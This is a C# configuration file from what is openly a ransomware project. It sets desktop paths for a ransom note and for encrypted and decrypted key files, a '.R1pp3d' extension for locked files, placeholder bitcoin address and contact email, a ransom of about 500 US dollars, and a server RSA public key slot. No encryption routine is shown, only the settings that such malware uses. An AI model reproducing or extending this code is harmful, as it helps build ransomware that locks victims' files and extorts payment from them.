using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

namespace Shared
{
    public class Config
    {
        public static readonly string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static readonly string NOTE_PATH = Utils.GetRandomPath(DESKTOP_FOLDER, ".txt");
        public static readonly string ENCRYPTED_PRIVATE_KEY = Utils.GetRandomPath(DESKTOP_FOLDER, ".txt");
        public static readonly string AES_KEYS_PATH = Utils.GetRandomPath(DESKTOP_FOLDER, ".txt");
        public static readonly string DECRYPTED_KEYS_PATH = Path.Combine(DESKTOP_FOLDER, "DecryptedKeys.txt");

        public static readonly string TEMPLATES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
        public static readonly string CURRENT_PATH = Assembly.GetEntryAssembly().Location;

        public const string DESKTOP_NOTE = @"";

        public const string RANSOMWARE_EXTENSION = ".R1pp3d";
        public const string BTC_ADDRESS = "ID";
        public const string EMAIL = "EMAIL";
        public const decimal USD_AMOUNT = 500.157M;

        public const string STRING_SERVER_PUBLIC_KEY = @"";

        public static readonly RSAParameters SERVER_PUBLIC_KEY = Utils.StringToKey(STRING_SERVER_PUBLIC_KEY);
    }
}
